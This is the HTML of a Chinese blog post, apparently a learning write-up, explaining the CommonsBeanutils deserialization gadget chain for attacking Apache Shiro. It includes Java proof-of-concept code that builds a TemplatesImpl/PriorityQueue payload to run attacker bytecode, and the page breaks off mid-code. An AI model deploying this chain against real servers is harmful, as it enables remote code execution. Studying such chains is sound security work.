@@ -1,0 +1,1828 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CommonsBeanutils反序列化, Ethe&#39;s blog">
+    <meta name="description" content="本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链
+前置知识commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean 的工具包。里面提供了各种各样的工具类，让我们可以">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>CommonsBeanutils反序列化 | Ethe&#39;s blog</title>
+    <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://epicture.oss-cn-beijing.aliyuncs.com/css/my.css">
+
+    <script src="https://epicture.oss-cn-beijing.aliyuncs.com/libs/jquery/jquery-3.6.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Ethe&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Ethe&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/8.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CommonsBeanutils反序列化</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: scroll;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                <span class="chip bg-color">web学习</span>
+                            </a>
+                        
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-04-27
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2023-05-02
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://epicture.oss-cn-beijing.aliyuncs.com/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean 的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。</p>
+<h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+     artifactId>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
+
+<h2 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h2><p><code>org.apache.commons.beanutils.PropertyUtils</code> 类使用 Java 反射 API 来调用 Java 对象上的通用属性 getter 和 setter 操作的实用方法。这些方法的具体使用逻辑其实是由 <code>org.apache.commons.beanutils.PropertyUtilsBean</code> 来实现的。</p>
+<p>这个类有个共有静态方法 <code>getProperty()</code> ，接收两个参数 bean （类对象）和 name（属性名），方法会返回这个类的这个属性的值。其实就是用反射的方式调用这个JavaBean里的get方法</p>
+<pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F;test.java
+package org.cb1;
+import org.apache.commons.beanutils.PropertyUtils;
+import java.lang.reflect.InvocationTargetException;
+
+public class test &#123;
+    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;
+        Object a &#x3D; PropertyUtils.getProperty(new javabean(), &quot;a&quot;);
+        System.out.println(a);
+
+    &#125;
+&#125;
+
+&#x2F;&#x2F;JavaBean
+package org.cb1;
+
+public class javabean &#123;
+    private int a &#x3D; 22222;
+    private String b &#x3D; &quot;aaa&quot;;
+
+    public int getA() &#123;
+        return a;
+    &#125;
+
+    public void setA(int a) &#123;
+        this.a &#x3D; a;
+    &#125;
+
+    public String getB() &#123;
+        return b;
+    &#125;
+
+    public void setB(String b) &#123;
+        this.b &#x3D; b;
+    &#125;
+&#125;</code></pre>
+
+<h2 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h2><p>BeanComparator 是 commons-beanutils 提供的用来比较两个 JavaBean 是否相等的类，其实现了java.util.Comparator 接口。</p>
+<p>BeanComparator 在初始化时可以指定 property 属性名称和 comparator 对比器，如果不指定，则默认是 ComparableComparator 。</p>
+<p>BeanComparator 的 compare 方法接收两个对象，分别调用 <code>PropertyUtils.getProperty()</code> 方法获取两个对象的 property 属性的值，然后调用 <code>internalCompare()</code> 方法调用实例化时初始化的 comparator 的 compare 方法进行比较。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428215653493.png" alt="image-20230428215653493"></p>
+<p>下个断点调试一下可以看见它最终还是调用了JavaBean里的getxx方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428215817191.png" alt="image-20230428215817191"></p>
+<h1 id="调用链（有CC依赖"><a href="#调用链（有CC依赖" class="headerlink" title="调用链（有CC依赖"></a>调用链（有CC依赖</h1><h2 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h2><p>CB链的反序列化链借助了CC3里提到的TemplatesImpl，通过动态类加载机制来执行恶意代码</p>
+<p>回忆一下CC3的TemplatesImpl部分</p>
+<p>从newTransformer方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428221135879.png" alt="image-20230428221135879"></p>
+<p>进入getTransletInstance</p>
+<p>getTransletInstance还会有实例化的过程</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428221154421.png" alt="image-20230428221154421"></p>
+<p>然后再进入defineTransletClasses方法</p>
+<p>在defineTransletClasses里调用了defineClass，实现加载类字节码并且实例化的目的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428222208457.png" alt="image-20230428222208457"></p>
+<p>这就是CC3的利用</p>
+<p>接下来让我们看看CB链里的利用</p>
+<h2 id="CB包里的调用"><a href="#CB包里的调用" class="headerlink" title="CB包里的调用"></a>CB包里的调用</h2><p>之前我们说过，PropertyUtils类的getProperty方法会调用JavaBean里的get方式，去读取相应的属性值</p>
+<p>传参方式是PropertyUtils.getProperty(Object bean,String name);</p>
+<p>但是在调用的时候，并不会去判断我们传入的这个name属性是否存在，也就导致，我们可以利用这个方法去调用任意的以get开头的公共方法</p>
+<p>巧的是TemplateImpl类里正好有一个这样的类，公共的、以get开头，而且还调用了newTransformer()，（巧了这不是</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430152923679.png" alt="image-20230430152923679"></p>
+<p>所以通过这个可以直接进CC3的链</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153325553.png" alt="image-20230430153325553"></p>
+<p>然后要去找哪里调用了getProperty方法</p>
+<p>这里是BeanComparator里的compare方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153718143.png" alt="image-20230430153718143"></p>
+<p>很简单的逻辑，property可以在初始化的时候赋值</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430153804089.png" alt="image-20230430153804089"></p>
+<h2 id="反序列化的实现"><a href="#反序列化的实现" class="headerlink" title="反序列化的实现"></a>反序列化的实现</h2><p>这里又要涉及CC2的内容了</p>
+<p>在CC2里，我们为了调用TransformingComparator的transform方法，从而调用TransformingComparator.transform方法找到了一条</p>
+<p>在PriorityQueue类的siftDownUsingComparator方法调用compare的路线</p>
+<p>虽然siftDownUsingComparator是私有的，但是在PriorityQueue类的readObject方法里调了heapify方法，heapify方法又调了siftDown，然后在siftDown里实现了对siftDownUsingComparator的调用</p>
+<p>这条链在CB链里同样适用</p>
+<p>唯一的问题就是在queue的赋值上</p>
+<p>在CC2的时候，由于我们通过compare调用的是chainedTransformer，所以无论它的transform方法的参数输出的是什么，得到的都是我们设置的固定值，因此即使compare的两个参数都是空，也不会影响结果</p>
+<p>而在CB链里，我们需要对compare的参数赋值，</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165153419.png" alt="image-20230430165153419"></p>
+<p>从这里看出来o1和o2的值分别为x和c，</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165530043.png" alt="image-20230430165530043"></p>
+<p>往前翻就能发现x的值就是heapify调siftDown的时候传的第二个参数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165706622.png" alt="image-20230430165706622"></p>
+<p>而c是在siftDownUsingComparator运算得到的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430165810775.png" alt="image-20230430165810775"></p>
+<p>但其实根本上都是queue这个数组里边的内容</p>
+<p>由于我们通过反射固定了size的值为2，所以这时候queue[i]其实就是queue[0]</p>
+<p>queue[child]就是queue[1]</p>
+<p>所以用反射赋值就行了</p>
+<pre class="language-java" data-language="java"><code class="language-java">Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);
+queue.setAccessible(true);
+queue.set(objects,new Object[]&#123;templates,1&#125;);</code></pre>
+
+<p>另外，这里也有另一种赋值方式</p>
+<pre class="language-java" data-language="java"><code class="language-java">Field field &#x3D; PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+field.setAccessible(true);
+Object[] objects &#x3D; (Object[]) field.get(queue);
+objects[0] &#x3D; tmpl;
+&#x2F;&#x2F;数组类型的值，通过反射的get方式得到的是一个引用类型的值，因此修改这个引用类型的值，也就相当于直接修改这个数组变量的值</code></pre>
+
+<p>这里只让一个值为TemplatesImpl对象实例的原因一是执行命令执行一次就够了，不过更主要的就是执行完命令后compare会抛出异常被catch捕捉，也执行不了第二个命令了。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430170306273.png" alt="image-20230430170306273"></p>
+<p>问：既然只执行一次命令，那queue这个对象数组只赋值一个行不行</p>
+<p>答：不行，因为假设queue这个只有一个值，那么在序列化的时候就会抛出数组越界的异常</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430170537544.png" alt="image-20230430170537544"></p>
+<p>poc为</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class test &#123;
+    public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123;
+        TemplatesImpl templates &#x3D; new TemplatesImpl();
+        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;123&quot;);
+        &#x2F;&#x2F; _class赋值为null
+        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);
+        classField.setAccessible(true);
+        classField.set(templates,null);
+        &#x2F;&#x2F;加载恶意类的字节码
+        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));
+        &#x2F;&#x2F;转为二维数组
+        byte[][] codes &#x3D; &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        &#x2F;&#x2F;_tfactory赋值
+        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);
+        tfactory.setAccessible(true);
+        tfactory.set(templates,new TransformerFactoryImpl());
+
+&#x2F;&#x2F;        Object transletInstance &#x3D; PropertyUtils.getProperty(templates, &quot;outputProperties&quot;);
+        BeanComparator&lt;Object&gt; objectBeanComparator &#x3D; new BeanComparator&lt;&gt;(&quot;outputProperties&quot;);
+        PriorityQueue&lt;Object&gt; objects &#x3D; new PriorityQueue&lt;&gt;(objectBeanComparator);
+        Field size &#x3D; objects.getClass().getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(objects,2);
+        Field queue &#x3D; objects.getClass().getDeclaredField(&quot;queue&quot;);
+        queue.setAccessible(true);
+        queue.set(objects,new Object[]&#123;templates,1&#125;);
+        file.serialize(objects,&quot;1.bin&quot;);
+        file.unserialize(&quot;1.bin&quot;);
+
+    &#125;
+&#125;</code></pre>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>调用链</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">PriorityQueue.readObject()
+    BeanComparator.compare()
+            PropertyUtils.getProperty()
+                PropertyUtilsBean.getProperty()
+                    TemplatesImpl.getOutputProperties()</code></pre>
+
+<p>依赖环境</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">cc 3.21 ~ 4.4
+cb 1.90 ~ 1.94
+其他版本没试</code></pre>
+
+<h1 id="调用链（无依赖"><a href="#调用链（无依赖" class="headerlink" title="调用链（无依赖"></a>调用链（无依赖</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚才的调用链，虽然很完美，但实际上还是依赖了CC链</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174452638.png" alt="image-20230430174452638"></p>
+<p>这里就算把maven项目里的cc依赖去掉也不会报错的原因就算cb本身就依赖着cc</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174544111.png" alt="image-20230430174544111"></p>
+<p>但是在最开始的时候，我就提过<code>本来是在学shiro 的，发现shiro无依赖反序列化需要用CB链，所以就先学一下CB链</code></p>
+<p>因为shiro本身需要添加的依赖有</p>
+<ol>
+<li>shiro-core、shiro-web，这是shiro本身的依赖</li>
+<li>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖</li>
+<li>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖</li>
+<li>commons-logging，这是shiro中用到的一个接口，不添加会爆<code>java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory</code>错误</li>
+</ol>
+<p>可以看到并没有CC依赖，所以，我们在进行shiro反序列化的时候就需要考虑不存在CC依赖的情况</p>
+<p>这时候可以发现在shiro的依赖中，还带着CB，所以我们就可以尝试用CB链去打shiro反序列化</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430174950619.png" alt="image-20230430174950619"></p>
+<p>但实际上，直接打是会报错的。</p>
+<blockquote>
+<p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p>
+</blockquote>
+<p>所以我们就需要找一个不需要依赖CC的CB链</p>
+<h2 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h2><p>我们先来看一下CB链中的哪一部分调用了CC的内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430175631340.png" alt="image-20230430175631340"></p>
+<p>就是BeanComparator里的这个构造方法，当我们只传入一个property的时候，就会默认调用CC中ComparableComparator类的getInstance方法</p>
+<p>所以要实现无依赖，就需要避免使用这个构造方法，但是property是必传的，所以只能用这个构造方法了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430175830790.png" alt="image-20230430175830790"></p>
+<p>我们需要找一个类，满足以下条件</p>
+<ul>
+<li>实现<code>java.util.Comparator</code>接口</li>
+<li>实现<code>java.io.Serializable</code>接口</li>
+<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
+</ul>
+<p>这里我们找到的是处于<code>java.lang.String</code>类下的一个内部私有类CaseInsensitiveComparator类</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230430180042241.png" alt="image-20230430180042241"></p>
+<p>所以现在的poc是</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class test &#123;
+    public static &lt;T&gt; void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, TransformerConfigurationException, NoSuchFieldException, IOException, ClassNotFoundException &#123;
+        TemplatesImpl templates &#x3D; new TemplatesImpl();
+        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(templates,&quot;123&quot;);
+        &#x2F;&#x2F; _class赋值为null
+        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);
+        classField.setAccessible(true);
+        classField.set(templates,null);
+        &#x2F;&#x2F;加载恶意类的字节码
+        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));
+        &#x2F;&#x2F;转为二维数组
